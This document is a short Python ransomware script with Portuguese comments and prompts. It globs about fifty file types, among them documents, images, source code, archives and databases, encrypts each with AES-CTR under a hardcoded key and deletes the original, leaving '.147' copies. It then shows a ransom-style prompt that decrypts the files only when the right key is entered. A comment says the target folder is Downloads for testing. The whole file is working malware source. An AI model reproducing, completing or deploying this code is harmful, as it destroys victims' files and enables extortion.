import os
import glob
import pyaes
import threading
from pathlib import Path

arquivos_extensoes = ["*.pl","*.7z","*.rar","*.m4a","*.py","*.cpp","*.cs","*.css","*.wma","*.avi","*.wmv","*.d3dbsp","*.sc2save","*.sie","*.sum","*.bkp","*.flv","*.js","*.raw","*.jpeg","*.tar","*.zip","*.tar*.gz","*.cmd","*.key","*.DOT","*.docm","*.txt", "*.doc", "*.docx", "*.xls", "*.xlsx", "*.ppt", "*.pptx", "*.odt", "*.jpg", "*.png", "*.csv", "*.sql", "*.mdb", "*.sln", "*.php", "*.asp", "*.aspx", "*.html", "*.xml", "*.psd", "*.bmp"]
pasta_inicial = Path.home()/"Downloads" # coloquei na downloads pra teste
 
def crypt():
    for arquivos in arquivos_extensoes:
        for formato in glob.glob(arquivos):
            f = open(f'{pasta_inicial}\\{formato}', 'rb')
            bkk = f.read()
            f.close()
            os.remove(f'{pasta_inicial}\\{formato}') 
            key = b"l1eqybC6EfUwOnxjI4XeimFkdnPPe9jV"
            aes = pyaes.AESModeOfOperationCTR(key)
            juuj = aes.encrypt(bkk)
            arquivo_batata = formato + ".147"
            arquivo_batata = open(f'{pasta_inicial}\\{arquivo_batata}', 'wb')
            arquivo_batata.write(juuj)
            arquivo_batata.close()

def decrypt(key):
    try:
        for arquivo in glob.glob('*.147'):
            blll = key.encode()
            batata = open(arquivo, 'rb')
            nbatata = batata.read()
            dkey = blll
            daes = pyaes.AESModeOfOperationCTR(dkey)
            bll = daes.decrypt(nbatata)
            formato = arquivo.split('.')
            bugalu = formato[0] + '.' + formato[1]
            bugalu2 = open(f'{pasta_inicial}\\{bugalu}', 'wb')
            bugalu2.write(bll)
            bugalu2.close()

    except Exception:
        pass

def main():
    key = input("[*] Seus arquivos foram criptografados. para descriptografá-los, Insira a chave de descriptografia: ")
    if key == 'l1eqybC6EfUwOnxjI4XeimFkdnPPe9jV':
       decrypt(key)
       for arquivos in glob.glob('*.147'):
           os.remove(arquivos)
           print('[!] Arquivo descriptografado: ' + arquivos)

threading.Thread(target=crypt).start()
main()